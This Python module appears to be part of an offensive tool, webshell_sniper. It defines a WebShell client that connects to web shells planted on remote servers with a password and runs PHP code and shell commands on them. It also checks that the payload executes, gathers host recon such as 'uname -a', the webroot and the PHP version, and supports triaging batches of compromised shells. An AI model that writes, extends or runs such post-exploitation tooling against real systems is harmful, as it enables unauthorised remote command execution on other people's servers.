"""The :class:`WebShell` model — a thin, well-behaved object per endpoint.

v1's ``WebShell`` was a 650-line god class that mixed transport, command
execution, recon, file transfer, injection and database logic together (with
mutable *class-level* attributes shared across instances).  Here ``WebShell`` is
just: connection state, the exec primitives (delegated to :class:`Executor`)
and lazily-cached metadata.  Higher-level behaviour lives in
:mod:`webshell_sniper.features`.
"""

from __future__ import annotations

from dataclasses import dataclass

from ..config import Config
from ..encoders import get_encoder
from ..exceptions import ConnectionFailed, ExecutionFailed, WebshellError
from ..utils.strings import random_token
from .backends import get_backend
from .executor import Executor
from .transport import Transport


@dataclass
class WebShellInfo:
    url: str
    method: str
    password: str

    def to_dict(self) -> dict[str, str]:
        return {"url": self.url, "method": self.method, "password": self.password}


class WebShell:
    def __init__(self, url: str, method: str, password: str, config: Config | None = None):
        config = config or Config()
        self.info = WebShellInfo(url, method, password.strip())
        self.transport = Transport(url, method, self.info.password, config)
        self.executor = Executor(
            self.transport, get_encoder(config.encoder), get_backend(config.lang)
        )
        self.working = False
        self.reason: str | None = None
        self._webroot: str | None = None
        self._php_version: str | None = None
        self._kernel_version: str | None = None

    # -- convenience accessors -------------------------------------------------
    @property
    def url(self) -> str:
        return self.info.url

    @property
    def method(self) -> str:
        return self.info.method

    @property
    def password(self) -> str:
        return self.info.password

    # -- exec primitives -------------------------------------------------------
    def run_php(self, code: str) -> str:
        return self.executor.run_php(code)

    def run_command(self, command: str) -> str:
        return self.executor.run_command(command)

    # -- liveness --------------------------------------------------------------
    def connect(self) -> bool:
        """Verify the endpoint is reachable *and* actually executes our code.

        On failure ``self.reason`` records *why* — distinguishing an unreachable
        host from one that responds but doesn't run our payload (usually a wrong
        password/parameter). Invaluable when triaging a batch of shells.
        """
        self.reason = None
        if not self.transport.is_reachable():
            self.working = False
            self.reason = "unreachable (no HTTP response)"
            return self.working
        try:
            # A successful sentinel round-trip means our payload truly executed.
            if self.executor.backend.supports_eval:
                ok = self.run_php("echo 'alive'").strip() == "alive"
            else:
                token = random_token(8)
                ok = token in self.run_command(f"echo {token}")
            if not ok:
                self.working = False
                self.reason = "reachable, but the payload did not execute (wrong password?)"
                return self.working
            self.working = True
        except ConnectionFailed as exc:
            self.working = False
            self.reason = f"connection failed: {exc}"
        except ExecutionFailed as exc:
            self.working = False
            self.reason = f"payload did not execute (wrong password/parameter?): {exc}"
        return self.working

    # -- cached metadata -------------------------------------------------------
    @property
    def webroot(self) -> str:
        if self._webroot is None:
            code = self.executor.backend.webroot_code()
            try:
                self._webroot = self.run_php(code).strip() if code else ""
            except WebshellError:
                self._webroot = ""
        return self._webroot

    @property
    def php_version(self) -> str:
        if self._php_version is None:
            code = self.executor.backend.version_code()
            try:
                self._php_version = self.run_php(code).strip() if code else ""
            except WebshellError:
                self._php_version = ""
        return self._php_version

    @property
    def kernel_version(self) -> str:
        if self._kernel_version is None:
            try:
                self._kernel_version = self.run_command("uname -a").strip()
            except WebshellError:
                self._kernel_version = ""
        return self._kernel_version

    def __str__(self) -> str:
        return f"{self.method} {self.url} (password={self.password!r})"
